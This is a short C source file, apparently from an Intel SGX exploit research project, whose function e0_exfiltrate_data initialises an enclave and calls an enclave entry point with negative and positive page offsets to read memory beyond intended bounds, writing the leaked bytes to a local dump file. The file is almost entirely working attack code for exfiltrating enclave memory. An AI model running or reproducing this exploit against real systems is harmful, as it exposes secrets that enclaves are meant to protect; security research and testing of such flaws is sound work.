#include "stdafx.h"
#include "exploits.h"
#include <stdio.h>
#include <stdlib.h>

#include "common_enclave_actions.h"


void e0_exfiltrate_data(char* server_ip, int iport, char* library_folder)
{
	if (!load_enclave() || ! init_enclave(server_ip, library_folder, iport))
	{
		printf("\n Can not initialize enclave, exiting ...\n");
		exit(2);
	}

	int page_shift = 20;
	char filename[1024];
	snprintf(filename, 1024, "%s\\dumped_pages.bin", library_folder);
	FILE* pages = fopen(filename, "wb");
	if (!pages)
	{
		printf("\n Can not open dump file, exiting ...\n");
		exit(2);
	}


	for (int i = -page_shift; i < page_shift; i++)
	{
		unsigned char page[1024];
		memset(page, 0, 1024);
		sgx_status_t ret;
		int res;

		ret = ecall_get_epg_page(global_eid, &res, i, 1024, page);

		fwrite(page, 1, 1024, pages);

	}
	fclose(pages);

	unload_enclave();


}